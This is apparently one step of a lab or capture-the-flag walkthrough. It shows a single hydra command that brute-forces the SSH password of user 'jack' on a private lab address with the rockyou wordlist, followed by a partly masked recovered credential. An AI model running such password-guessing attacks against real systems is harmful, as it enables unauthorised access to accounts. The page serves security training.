<div class='page'><h1 class='title'>3.2 Get user's password with Hydra</h1><br/><p></p><p>1. Use “hydra” to guess “jack&#39;s” password by brute force.</p><p>    <div class="codebox"><pre>$ hydra -l jack -P <span style="color:#a52a2a;font-weight:700">/</span>usr<span style="color:#a52a2a;font-weight:700">/</span>share<span style="color:#a52a2a;font-weight:700">/</span>wordlists<span style="color:#a52a2a;font-weight:700">/</span>rockyou.txt 192.168.12.66 <span style="color:#a52a2a;font-weight:700">ssh</span><br /></pre></div></p><p></p><p>    <span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1039-1.png" alt="images/1039-1.png" /></p><p></p><p>    Credentials: jack:j******a</p><p>    </p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
